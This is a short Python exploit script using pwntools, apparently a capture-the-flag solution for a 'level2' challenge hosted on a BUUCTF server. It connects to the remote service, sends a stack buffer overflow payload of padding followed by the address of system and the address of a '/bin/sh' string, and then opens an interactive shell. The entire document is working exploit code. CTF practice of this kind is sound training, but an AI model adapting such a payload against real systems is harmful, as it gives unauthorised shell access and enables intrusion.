from pwn import *

io = remote('node4.buuoj.cn', 28530)
elf = ELF('./level2')
system_addr = elf.symbols['system']
bin_sh_addr = 0x804a024 # ROPgadget --binary ./level2 --string "/bin/sh"
payload = b'a'*(0x88+0x4) + p32(system_addr) + p32(0) + p32(bin_sh_addr)
io.sendlineafter(b'Input:\n', payload)
io.interactive()